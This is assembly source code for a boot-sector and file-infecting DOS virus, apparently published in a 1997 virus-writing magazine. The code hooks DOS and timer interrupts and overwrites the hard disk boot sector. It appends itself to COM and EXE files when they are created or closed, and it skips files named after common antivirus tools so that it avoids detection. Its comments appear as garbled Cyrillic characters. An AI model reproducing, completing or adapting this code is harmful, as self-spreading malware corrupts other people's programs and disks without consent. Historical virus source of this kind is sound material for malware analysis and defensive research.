;
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € €  € €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € €  € €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €  € €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;
;-------------------------------------------------------------------------
; MCE-Len*512
; Ç®‡„· ß†‡†¶†•‚ COM ® EXE ‰†©´Î Ø‡® ®Â ·Æß§†≠®®
; (‚ÆÁ≠•• Ø‡® ß†™‡Î‚®® ≠Æ¢Æ·Æß§†≠≠Æ£Æ ‰†©´†).
; í†™¶• ß†‡†¶†•‚·Ô ß†£‡„ßÆÁ≠Î© ·•™‚Æ‡ Ø•‡¢Æ£Æ ´Æ£®Á•·™Æ£Æ §®·™† ≠† Ø•‡¢Æ¨
; HD. (Ô ‡•Ë®´ ≠• ÆØ‡•§•´Ô‚Ï §•©·‚¢®‚•´Ï≠Î© ·®·‚•¨≠Î© §®·™ - ´•≠Ï
; ¢Æß®‚Ï·Ô!!!)
; Ç Ø†¨Ô‚Ï ®≠·‚†´®‡„•¨·Ô íéãúäé Ø‡® Ø•‡•ß†£‡„ß™• ¨†Ë®≠Î.
; è‡® ß†Ø„·™• Ø‡Æ£‡†¨¨Î ‰-Ê®•© 4B00h ¢®‡„· ´•Á®‚ ß†£‡„ßÆÁ≠Î© ·•™‚Æ‡.
; è‡® ®·ØÆ´≠•≠®® ‰-Ê®® 4Cxxh ß†£‡„ßÆÁ≠Î© ·•™‚Æ‡ ß†‡†¶†•‚·Ô ·≠Æ¢†!!!
;
; Ñ†≠≠Î© ‚•™·‚ ≠• Ø‡ÆÂÆ§®´ ÆØ‚®¨®ß†Ê®Ó...Sorry.
;-------------------------------------------------------------------------
                .model tiny
                .code
;-------------------------------------------------------------------------
len     equ     4       ; Len virus in sectors (include boot part)
;////////////////////////////////////////////////////
;       Start BOOT part (installer for Dos part...)
                org 0
;////////////////////////////////////////////////////
BootStart:
                jmp     BootCode
;--------------------------------------------------------------
BootData        db      40h dup (0)     ; Data for boot sector.
;--------------------------------------------------------------
BEEP:
                push    ax
                mov     ax,0e07h
                int     10h
                pop     ax
                ret
BootCode:
                nop
                nop
                cli
                xor     di,di
                mov     si,7C00h
                mov     bx,si
                mov     ds,di
                mov     ss,di
                mov     sp,si
                sti
                ;
                int     12h
                sub     ax,96   ; - 96 kb.
                mov     cl,6
                shl     ax,cl
                mov     es,ax   ; ES = segment for our body
                ;
                cld
                mov     cx,512
                rep     movsb   ; Transmit body
                ;
                push    ax
                mov     ax,offset BootInstall
                push    ax
                retf
;-------------------------------------------------------------
BootInstall:
                mov     si,1Ch*4
                push    si
                lea     di,OldTimerAddr
                movsw
                movsw
                ;
                cli
                pop     di
                mov     word ptr ds:[di],offset TimerManager
                mov     word ptr ds:[di+2],es
                sti
                ;
                push    ds
                pop     es
                mov     ax,0201h
                mov     cx,0009
                mov     dx,0080h
                push    es
                push    bx
                int     13h
                retf
;-------------------------------------------------------------
OldTimerAddr    dw      0,0
;-------------------------------------------------------------
TimerManager:
                push    ds es ax bx di si
                ;
                xor     ax,ax
                mov     es,ax
                mov     ds,ax
                ;
                mov     ax,ds:[(21h*4)+2]
                cmp     ah,08
                ja      ExitTimer
                mov     cs:Seg21h,ax
                mov     ax,ds:[21h*4]
                mov     cs:Ofs21h,ax
                ;
                mov     word ptr ds:[21h*4],offset InstallDosManager
                mov     ds:[(21h*4)+2],cs
                ;
                push    cs
                pop     ds
                lea     si,OldTimerAddr
                mov     di,1Ch*4
                cld
                movsw           ; Return old timer procedure
                movsw
ExitTimer:
                pop     si di bx ax es ds
                iret
;-------------------------------------------------------------
InstallDosManager:
                cmp     ax,4B00h
                jz      FullInstall
                ;
OldDosManager:
                db      0EAh
Ofs21h          dw      0
Seg21h          dw      0
                ;
;---------------------------------------------------
i21h:
                pushf
                call    dword ptr cs:[offset Ofs21h]
                ret
;---------------------------------------------------
FullInstall:
                push    ax bx cx dx si di es ds
                ;
                push    cs
                pop     ds
                ;
                mov     ah,48h
                mov     bx,4096/16
                int     21h     ; AX = Segment of new area for virus
                jc      NoInstalled
                ;
                mov     es,ax
                xor     si,si
                mov     di,si
                ;
                cld
                mov     cx,512
                mov     bx,cx
                rep     movsb
                ;
                dec     ax
                mov     ds,ax
                mov     word ptr ds:[01],0070h  ; MSDOS segment
                ;
                mov     ds,cx
                ;
                mov     ax,0204h    ; Read 4 sectors (2 kb)
                mov     cx,0010     ; (virus body - without current part)
                mov     dx,0080h
                int     13h
                ;
                mov     word ptr ds:[21h*4],offset VirusDosManager
                mov     ds:[(21h*4)+2],es
                ;
                call    BEEP    ;*****************************<<<<<<<<<<
                ;
NoInstalled:
                pop     ds es di si dx cx bx ax
                jmp     OldDosManager
;-------------------------------------------------------------
                org 510
                db      55h,0AAh        ; 'U™'
;-------------------------------------------------------------
;/////////////////////////////////////////////////////////////
;       Start Dos TSR file infector.
                org 512
;/////////////////////////////////////////////////////////////
VirusDosManager:
                cmp     ax,0FFAAh       ; Our copy call us
                jnz     LookNextFun
                stc                     ; CY=1
                retf    2
LookNextFun:
                cmp     ah,4Ch
                jnz     LookRunFun
                jmp     ExitProg
LookRunFun:
                cmp     ax,4B00h
                jnz     LookCREATE
                jmp     RunProg
LookCREATE:
                cmp     cs:Fhandle,0    ; <>0 then file processed!!!
                jnz     LookCloseOurFile
                ;
                cmp     ah,3Ch          ; Create
                jz      OurFun
                cmp     ah,5Bh          ; Create
                jz      OurFun
ExitVDM:
                jmp     OldDosManager
;-----------------------------------------------------
LookCloseOurFile:
                cmp     ah,3Eh          ; Close
                jnz     ExitVDM
                cmp     cs:Fhandle,bx
                jnz     ExitVDM
                jmp     InfectClosedFile
;-----------------------------------------------------
OurFun:
                push    ax si
                ;
                cld
                mov     si,dx
LookNULL:
                lodsb
                cmp     al,'.'
                jnz     LookNULL
                lodsw
                ;
                or      ax,2020h        ; '  '
                cmp     ax,'xe'         ; EXe
                jnz     LookCOM
                lodsb
                or      al,20h
                cmp     al,'e'          ; exE
                jnz     NoOurEXT
                mov     Ftype,1
                jmp     GetHandle
LookCOM:
                cmp     ax,'oc'         ; COm
                jnz     NoOurEXT
                lodsb
                or      al,20h
                cmp     al,'m'          ; coM
                jnz     NoOurEXT
                mov     Ftype,2
GetHandle:
                mov     si,dx
                push    bp
                mov     bp,dx
LookTild:
                lodsb
                cmp     al,0
                jz      LookFileName
                cmp     al,'\'
                jnz     LookTild
                mov     bp,si
                jmp     LookTild
LookFileName:
                mov     si,bp
                pop     bp
                lodsw
                or      ax,2020h
                cmp     ax,'rd'         ; DRweb
                jz      NoOurEXT
                cmp     ax,'ia'         ; AIdstest
                jz      NoOurEXT
                cmp     ax,'da'         ; ADinf
                jz      NoOurEXT
                cmp     ax,'sm'         ; MScan
                jz      NoOurEXT
                ;
                pop     si ax
                call    i21h            ; int   21h
                mov     cs:Fhandle,ax
                jnc     e1
                mov     cs:Fhandle,0
e1:
                retf    2
NoOurEXT:
                pop     si ax
                jmp     ExitVDM
;---------------------------------------------------------
bootCX          dw      0
bootDX          dw      0
;---------------------------------------------------------
InfectClosedFile:
                push    ax bx cx dx es ds si di bp
                ;
                push    cs
                pop     ds
                call    InfectFile
                ;
                pop     bp di si ds es dx cx bx ax
                ;
                jmp     OldDosManager
;---------------------------------------------------------
;/////////////////////////////////////////////////////////
;---------------------------------------------------------
FileInstaller:
                call    $+3
                pop     bp
                sub     bp,03
                mov     ax,0FFAAh
                int     21h
                jc      ExitFileInstall
                cmp     al,0
                jnz     ExitFileInstall
                push    es ds
                call    InstallVirus_to_PC
                pop     ds es
ExitFileInstall:

cmp word ptr cs:[bp][offset OriginBytes-offset FileInstaller],'ZM'
jz L_exe

;-Loaded from com file.-------------------------------------------
                mov    di,100h
                lea    si,[bp][offset OriginBytes-offset FileInstaller]
                push   di
                movsw
                movsw
                movsb
                ret             ; Go to infected com program.
;----------------------------
OriginBytes     Label   Byte
                mov     ax,4c00h
                int     21h
                db      20h dup (90h)
;----------------------------
;-Loaded from exe file.--------------------------------------------
L_exe:
                mov     ax,es
                add     ax,10h
                push    ax
                add     cs:[bp][offset CS_file-offset FileInstaller],ax
                pop     ax
SS_file:        add     ax,0000
                cli
                mov     ss,ax
SP_file:        mov     sp,0000
                sti
                db      0eah
IP_file         dw      ?
CS_file         dw      ?
;-------------------------------------------------------------------
InstallVirus_to_PC:
                push    cs
                pop     ds
                mov     ax,0B900h       ; 3 page of videobuffer
                mov     es,ax
                xor     bx,bx
                ;
                mov     ax,0201h        ; READ MBR
                mov     cx,1
                mov     dx,80h
                int     13h     ; ES:BX = B900:0000h
                ;
                jnc     ReadOk
OurBoot:
                ret
ReadOk:
;               cmp     byte ptr es:[bx+01BEh],80h      ; Bootable disk ?
                mov     cx,es:[bx+01C0h]        ; sect,cyl
                mov     dh,es:[bx+01BFh]        ; head
                ;

mov     ds:[bp][(offset FIend-offset FileInstaller)+offset bootCX],cx
mov     ds:[bp][(offset FIend-offset FileInstaller)+offset bootDX],dx

                ;
                mov     ax,0201h        ; READ BOOT on drive C:\
                int     13h
                cmp     word ptr es:[bx+offset BootCode],9090h
                jz      OurBoot         ; Already infected!!!
                ;
                push    cx dx
                ;
                mov     ax,0301h        ; WRITE OLD BOOT to unuseble section
                mov     dx,80h
                mov     cx,9
                int     13h
                ;
                push    es ds
                pop     es ds
                cld
                mov     si,offset BootData
                lea     di,[bp+si][offset FIend-offset FileInstaller]
                mov     cx,40h
                rep     movsb   ; Copy origin Boot Data to Virus Boot Data
                ;
                push    cs
                pop     ds
                lea     bx,[bp][offset FIend-offset FileInstaller+512]
                ;
                mov     ax,0304h        ; WRITE VIRUS BODY
                mov     cx,10
                int     13h
                ;
                sub     bx,512
                mov     ax,0301h ; WRITE VIRUS BOOT SECTOR in system area
                pop     dx cx
                int     13h
                ret
;---------------------------------------------------------
                FIend   label   byte
;---------------------------------------------------------
;/////////////////////////////////////////////////////////
;---------------------------------------------------------
; ENTER : BX = File Handle
; EXIT  : File not CLOSED!!! , Fhandle = 0
InfectFile:
                call    diskryptor
                mov     ah,3fh
                mov     cx,18h
                mov     dx,offset OriginBytes
                mov     si,dx
                int     21h
                jc      _1
                cmp     word ptr ds:[offset OriginBytes],'ZM'
                jz      _EXE
                cmp     word ptr ds:[offset OriginBytes+3],'::'
                jz      _1
;-Infect .COM --------------------------------
                cmp     bp,(65500-(512*Len))
                ja      _1                      ;Ñ´®≠† °Æ´ÏË• §ÆØ„·‚®¨Æ©.
                mov     es:[di+21],bp           ;F.p. = end file.
;-Make JMP------------------------------------
                sub     bp,03
                mov     ds:[offset jmp_n],bp
                call    WriteBody
                jc      _1b
                mov     cx,05h
                mov     dx,offset new_3_byte
ExitWrite:
                mov     ah,40h
                int     21h
_1b:            jmp     exit_date
_1:             ret
;-Infect .EXE ---------------------------------
_EXE:
                cmp     ds:[si+12h],'::'        ; Already infected ?
                jz      _1                      ; Yes!
                mov     ax,ds:[si+4]            ; Pages (512b).
                dec     ax
                mov     cx,512
                mul     cx
                add     ax,[si+2]       ; DX:AX = File len from header.
                cmp     ax,bp           ; Real file len = dx:ax ?
                jnz     _1              ; No - this is overlay.
                cmp     es:[di+19],dx   ; ********************
                jnz     _1              ; No - this is overlay.
;-----
                mov     es:[di+21],ax   ; F.p.= end file.
                mov     es:[di+23],dx
;-Get header.-----------------------------------
                mov     [si+12h],'::'
                mov     ax,[si+14h]
                mov     ds:[offset IP_file],ax
                mov     ax,[si+16h]
                mov     ds:[offset CS_file],ax
                mov     ax,[si+10h]
                mov     word ptr ds:[offset SP_file+1],ax
                mov     ax,[si+0eh]
                mov     word ptr ds:[offset SS_file+1],ax
;-----------------------------------------------
                xchg    ax,bp
                mov     cx,10h
                div     cx
                sub     ax,[si+8]
                sbb     dx,0
                mov     [si+16h],ax     ; ReloCS.
                mov     [si+0eh],ax     ; ReloSS
                mov     [si+14h],dx     ; ExeIP.
                mov     [si+10h],4096   ; ExeSP
;-Correcting file len in header.----------------
                add     word ptr [si+4],len     ; Newlen=OldLen+(512*len)
;-Write virus in file.--------------------------
                call    WriteBody
                jc      exit_date
;-Write new header.-----------------------------
                mov     cx,18h
                mov     ah,40h
                mov     dx,offset OriginBytes
                int     21h
exit_date:
                mov     ax,5701h
                mov     cx,es:[di+13]
                mov     dx,es:[di+15]
                int     21h
                ret
;----------------------------------------------
WriteBody       proc
                mov     Fhandle,0
                mov     dx,offset FileInstaller
                mov     cx,(offset FIend - offset FileInstaller)
                mov     ah,40h
                int     21h
                xor     dx,dx
                mov     cx,512*len
                mov     ah,40h
                int     21h
                mov     es:[di+21],dx           ; F.p.= start file.
                mov     es:[di+23],dx           ;
                ret
WriteBody       endp
;----------------------------------------------
diskryptor      proc
                mov     ax,1220h
                push    bx
                int     2fh
                mov     bl,es:[di]
                mov     ax,1216h
                int     2fh
                pop     bx
                mov     byte ptr es:[di+2],02   ; mode = r/w.
                xor     dx,dx
                mov     es:[di+21],dx   ; F.p.= end file.
                mov     es:[di+23],dx   ; F.p.= end file.
                mov     bp,es:[di+17]
                ret
diskryptor      endp
;-----------------------------------------------
Ftype           db      0       ; 1 - EXE ; 2 - COM
Fhandle         dw      0       ; Handle of this file or 0000 for NoFile
;-----------------------------------------------
new_3_byte      db      0e9h
jmp_n           dw      0000
                db      '::'
;---------------------------------------------------------
ExitProg:
                push    ax bx cx dx es cs
                pop     es
                ;
                mov     ax,0301h
                mov     cx,cs:bootCX
                mov     dx,cs:bootDX
                xor     bx,bx
                int     13h
                ;
                pop     es dx cx bx ax
                jmp     ExitVDM
;---------------------------------------------------------
RunProg:
                push    ax bx cx dx es cs
                pop     es
                ;
                mov     ax,0201h        ; READ ORIGIN BOOT
                mov     cx,0009
                mov     dx,0080h
                lea     bx,Buffer
                int     13h
                ;
                mov     ax,0301h  ; WRITE ORIGIN BOOT TO •£Æ ORIGIN PLACE
                mov     cx,cs:bootCX
                mov     dx,cs:bootDX
                int     13h
                ;
                pop     es dx cx bx ax
                jmp     ExitVDM
;---------------------------------------------------------
;/////////////////////////////////////////////////////////
;---------------------------------------------------------
db '(c) Light General.Kiev.KIUCA.1996.NOT for free use.',0
db '(êÆ°™†Ô ØÆØÎ‚™† ÆØ„·‚®‚Ï Ä§®≠‰...Ä§Æ´Ï‰...âÆ·®‰...ÉìãÄÉ...AÄaa†)',0
;---------------------------------------------------------
Header          db      20h dup (?)
Buffer          db      512 dup (?)
;----------------------------------------------------------------------
Virus1stInstaller:
                mov     ax,offset FIend-offset FileInstaller
                xor     bp,bp
                sub     bp,ax
                call    InstallVirus_to_PC
                mov     ax,4c00h
                int     21h
;-----------------------------------------------------------------------
.stack          1024

                end     Virus1stInstaller